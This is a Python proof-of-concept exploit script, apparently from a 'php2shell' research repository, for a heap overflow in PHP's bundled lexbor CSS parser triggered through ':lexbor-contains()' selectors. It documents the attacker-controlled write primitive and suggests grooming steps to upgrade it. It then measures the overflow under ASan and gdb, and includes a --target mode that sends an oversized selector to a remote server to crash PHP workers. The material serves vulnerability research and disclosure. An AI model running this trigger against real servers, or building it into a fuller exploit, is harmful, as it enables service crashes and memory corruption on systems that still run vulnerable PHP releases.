#!/usr/bin/env python3
# INDEX: lexbor-contains linear heap overflow, far reach | all | needs attacker-controlled selector
r"""lexbor :lexbor-contains() FAR-REACH heap WRITE -- an unbounded-forward
contiguous (linear/relative) overflow, reach bounded only by mapped memory.

Capability: Dom\HTMLDocument::querySelector[All](':lexbor-contains("<attacker>")')
drives memcpy(str->data, data, length+1) where str->data is a 16-byte allocation,
so length+1 attacker bytes are written CONTIGUOUSLY forward from the end of the
4096-byte CSS-parser mraw pool chunk into whatever follows.
  * REACH: write size == attacker length+1, NO tokenizer cap (ASan: len 20000 ->
    20001, 524288 -> 524289, 4194304 -> 4194305), origin at the chunk end ("located
    0 bytes after"), and scales to MiB.
  * CONTENT: fully attacker-controlled EXCEPT a literal NUL (CSS maps U+0000 ->
    U+FFFD, so no 0x00 byte) and the closing '"' (escape as \22 / use the IDENT form).
  * SHAPE: LINEAR contiguous overflow, NOT a single-target arbitrary-address write;
    it clobbers everything between str->data and the target. A surgical write is a
    two-stage upgrade (overflow a groomed pointer-bearing ZendMM neighbour, or smash
    a zend_array nNumUsed / zend_string len, then deref) -- not implemented here.
  * ALLOCATOR: in stock php the lexbor allocators route through emalloc -> ZendMM, so
    forward neighbours are ZendMM-managed and groomable with PHP strings/arrays/
    objects. (The ASan lab uses USE_ZEND_ALLOC=0, so ASan sees a clean 4104-byte
    glibc region.)

Bug: ext/dom/lexbor/lexbor/css/selectors/pseudo_state.c,
lxb_css_selectors_state_pseudo_class_function_lexbor_contains() allocs
sizeof(lexbor_str_t)=16 but memcpy's length+1. This is a DISTINCT bug, NOT
CVE-2026-109618/109619.

Tested (source-verified): VULN 8.4.26, 8.5.11; FIXED 8.5.12 (+ 8.4.x backport:
alloc length+1 / memcpy length).

Modes:
  --asan-reach   deterministic ASan size proof (default), uses the prebuilt lab image
  --stock-smear  gdb corroboration on a stock 8.4.26 build (needs SYS_PTRACE)
  --target URL   remote reachability only -- a crash/corruption, NOT an observable write
"""
import argparse, subprocess, sys, pathlib, re, tempfile, os, urllib.parse
import urllib.request, urllib.error, http.client, socket

# repo root is four levels up: .../poc/primitives/write/<file>
ROOT = pathlib.Path(__file__).resolve().parents[3]
LAB = ROOT / "lab" / "lexbor"
ASAN_IMAGE = "php2shell-lexbor-asan:latest"
STOCK_IMAGE = "php2shell-cli-426:scratch"      # stock 8.4.26 CLI (has Dom\HTMLDocument)
GDB_IMAGE = "p2s-cli426-gdb:latest"            # throwaway: STOCK_IMAGE + gdb
FORWARD_CAP = 16384                                 # 253*64 ~= 16 KiB reference bound
FRAME = "lxb_css_selectors_state_pseudo_class_function_lexbor_contains"

_WRITE_RE = re.compile(r"WRITE of size (\d+) at (0x[0-9a-f]+)")
_REGION_RE = re.compile(r"located (\d+) bytes after (\d+)-byte region")


def _have_image(name):
    r = subprocess.run(["docker", "images", "-q", name], capture_output=True, text=True)
    return bool(r.stdout.strip())


# Mode 1: ASan reach proof (deterministic; the core evidence).
def asan_run(length, timeout=120):
    """Run the lexbor overflow at `length` in the ASan container; return combined output."""
    cmd = ["docker", "run", "--rm", "-v", f"{LAB}:/work:ro",
           "-e", "ASAN_OPTIONS=detect_leaks=0:abort_on_error=0:exitcode=99",
           "-e", "USE_ZEND_ALLOC=0", "-e", "USE_TRACKED_ALLOC=1",
           ASAN_IMAGE, "php", "-n", "/work/lexbor_overflow.php", str(length)]
    p = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
    return (p.stdout or "") + (p.stderr or "")


def asan_measure(length):
    """Return (write_size, located_after, region_size, frame_ok) for one length."""
    out = asan_run(length)
    wm = _WRITE_RE.search(out)
    rm = _REGION_RE.search(out)
    frame_ok = FRAME in out
    write_size = int(wm.group(1)) if wm else None
    located = int(rm.group(1)) if rm else None
    region = int(rm.group(2)) if rm else None
    return write_size, located, region, frame_ok, out


def cmd_asan_reach(lens):
    if not _have_image(ASAN_IMAGE):
        print(f"[-] ASan image {ASAN_IMAGE} missing; build via "
              f"`python3 -I poc/verify_lexbor_contains_overflow.py` first.")
        return 2
    print("[*] lexbor :lexbor-contains() far-reach WRITE -- ASan size proof")
    print(f"    var_hash_rw forward wall = {FORWARD_CAP} bytes (253*64). Claim: write size == len+1, uncapped.\n")
    rows, ok = [], True
    for L in lens:
        ws, loc, reg, frame, _out = asan_measure(L)
        scales = (ws == L + 1)
        chunk_end = (loc == 0)                 # write starts AT the chunk end -> runs forward
        beyond = (ws is not None and ws > FORWARD_CAP)
        rows.append((L, ws, loc, reg, frame, scales, chunk_end, beyond))
        tag = "beyond-var_hash_rw" if beyond else "within-16KiB"
        print(f"  len={L:<9} WRITE_of_size={ws}  located_after={loc}B  region={reg}B  "
              f"frame={'ok' if frame else 'MISSING'}  size==len+1:{scales}  [{tag}]")
        if not (frame and scales and chunk_end):
            ok = False
    print()
    big = [r for r in rows if r[0] + 1 > FORWARD_CAP]
    if ok and big and all(r[7] for r in big):
        mx = max(r[1] for r in rows if r[1])
        print(f"[+] PASS: attacker-controlled write size (== len+1), origin at chunk end, "
              f"uncapped to {mx} bytes.")
        print(f"    FAR-REACH forward write CONFIRMED beyond the var_hash_rw {FORWARD_CAP}-byte wall.")
        return 0
    print("[-] FAIL: expected size==len+1 at chunk end, exceeding the var_hash_rw cap.")
    return 1


# Mode 2: stock-build smear (gdb; corroboration, best-effort).
_TRIGGER_PHP = r"""<?php
$len = (int)($argv[1] ?? 524288);
$doc = Dom\HTMLDocument::createFromString('<html><body><p>x</p></body></html>', LIBXML_NOERROR);
$marker = "P2S_ORIGIN_MARK!";                         // 16 bytes
$payload = $marker . str_repeat('A', $len - strlen($marker));
fwrite(STDERR, "[*] contains() len=".strlen($payload)."\n");
$r = $doc->querySelectorAll(':lexbor-contains("'.$payload.'")');
fwrite(STDERR, "[*] survived; matched {$r->length}\n");
usleep(600000000);
"""

# gdb pins str->data via its mraw size header (0x10) immediately preceding the
# 16-byte marker, then measures the contiguous forward attacker-byte (0x41) run.
_PIN_GDB = r"""set pagination off
set confirm off
catch syscall clock_nanosleep
run
python
import gdb,re
inf=gdb.selected_inferior()
sig=b"\x10\x00\x00\x00\x00\x00\x00\x00P2S_ORIGIN_MARK!"
out=gdb.execute("info proc mappings",to_string=True)
regs=[]
for line in out.splitlines():
    m=re.match(r"\s*(0x[0-9a-f]+)\s+(0x[0-9a-f]+)\s+(0x[0-9a-f]+)\s+(0x[0-9a-f]+)\s+(\S+)",line)
    if m and 'w' in m.group(5): regs.append((int(m.group(1),16),int(m.group(2),16)))
def run41(a):
    n=0
    while True:
        try:
            b=inf.read_memory(a,1)[0]; b=b[0] if isinstance(b,(bytes,bytearray)) else ord(b)
        except Exception: break
        if b!=0x41: break
        n+=1;a+=1
        if n>0x4000000: break
    return n
best=0
for (s,e) in regs:
    a=s
    while a<e:
        try: f=inf.search_memory(a,e-a,sig)
        except Exception: f=None
        if not f: break
        fwd=run41(f+8+16)
        print("PIN str->data=0x%x fwd0x41=%d"%(f+8,fwd))
        best=max(best,fwd); a=f+8
print("SMEAR_MAX=%d"%best)
end
quit
"""


def _ensure_gdb_image():
    if _have_image(GDB_IMAGE):
        return True
    if not _have_image(STOCK_IMAGE):
        print(f"[-] stock image {STOCK_IMAGE} missing; cannot build {GDB_IMAGE}.")
        return False
    print(f"[*] building {GDB_IMAGE} ({STOCK_IMAGE} + gdb) ...")
    d = tempfile.mkdtemp()
    with open(os.path.join(d, "Dockerfile"), "w") as f:
        f.write(f"FROM {STOCK_IMAGE}\n"
                "RUN apt-get update && apt-get install -y --no-install-recommends gdb "
                "&& rm -rf /var/lib/apt/lists/*\n")
    b = subprocess.run(["docker", "build", "-t", GDB_IMAGE, d], text=True)
    return b.returncode == 0


def cmd_stock_smear(length):
    if not _ensure_gdb_image():
        print("[-] stock-smear unavailable (missing base image / no network for apt).")
        return 2
    d = tempfile.mkdtemp()
    tp = os.path.join(d, "trigger.php"); gp = os.path.join(d, "pin.gdb")
    with open(tp, "w") as f: f.write(_TRIGGER_PHP)
    with open(gp, "w") as f: f.write(_PIN_GDB)
    print(f"[*] stock 8.4.26 under gdb: len={length}, pinning str->data via mraw header ...")
    cmd = ["docker", "run", "--rm", "--cap-add=SYS_PTRACE",
           "--security-opt", "seccomp=unconfined", "-v", f"{d}:/work:ro",
           GDB_IMAGE, "gdb", "-q", "-batch", "-x", "/work/pin.gdb",
           "--args", "php", "-n", "/work/trigger.php", str(length)]
    p = subprocess.run(cmd, capture_output=True, text=True, timeout=240)
    out = (p.stdout or "") + (p.stderr or "")
    smear = None
    for line in out.splitlines():
        if line.startswith("PIN ") or line.startswith("SMEAR_MAX="):
            print("    " + line.strip())
        if line.startswith("SMEAR_MAX="):
            smear = int(line.split("=", 1)[1])
    print()
    print("    NOTE: the at-sleep window UNDERCOUNTS the write: post-overflow PHP")
    print("    activity reclaims most of the smeared ZendMM region. ASan proves the")
    print("    full, uncapped write size; this only corroborates str->data sits at")
    print("    the chunk end with a surviving forward attacker-byte window.")
    if smear is not None and smear > FORWARD_CAP:
        print(f"[+] corroborated: surviving forward smear {smear}B > var_hash_rw {FORWARD_CAP}B wall.")
        return 0
    if smear is not None:
        print(f"[*] surviving window {smear}B (reclaimed below the cap; ASan is authoritative).")
        return 0
    print("[-] str->data not pinned; see raw gdb output.")
    return 1


# Mode 3: remote reachability (crash oracle only; no observable write).
def cmd_target(target, length):
    sel = ':lexbor-contains("' + "A" * length + '")'
    url = target.rstrip("/") + "/selector.php?sel=" + urllib.parse.quote(sel)
    base = target.rstrip("/") + "/selector.php?sel=" + urllib.parse.quote(':lexbor-contains("ok")')
    print("[*] NOTE: remotely this bug is a crash/corruption, not an observable write.")
    try:
        with urllib.request.urlopen(base, timeout=10) as r:
            print("[*] baseline sink OK: " + r.read().decode(errors="replace").strip())
    except Exception as e:
        print(f"[-] baseline failed ({e}); is the lab up?"); return 2
    try:
        with urllib.request.urlopen(url, timeout=15) as r:
            print("[*] response: " + r.read().decode(errors="replace").strip())
            print("[-] worker survived (stock build may silently corrupt; ASan aborts)")
            return 1
    except (urllib.error.URLError, http.client.RemoteDisconnected,
            ConnectionResetError, socket.timeout) as e:
        print(f"[+] worker died on oversized selector: {type(e).__name__}: {e}")
        return 0


def main():
    ap = argparse.ArgumentParser(description="lexbor far-reach heap WRITE primitive (beyond var_hash_rw 16 KiB)")
    ap.add_argument("--asan-reach", action="store_true", help="ASan size proof (default)")
    ap.add_argument("--lens", default="4096,20000,524288,4194304",
                    help="comma lengths for --asan-reach")
    ap.add_argument("--stock-smear", action="store_true", help="gdb corroboration on stock build")
    ap.add_argument("--len", type=int, default=524288, help="length for --stock-smear / --target")
    ap.add_argument("--target", help="remote selector sink base URL (crash oracle)")
    a = ap.parse_args()
    if a.target:
        sys.exit(cmd_target(a.target, a.len))
    if a.stock_smear:
        sys.exit(cmd_stock_smear(a.len))
    lens = [int(x) for x in a.lens.split(",") if x.strip()]
    sys.exit(cmd_asan_reach(lens))


if __name__ == "__main__":
    main()
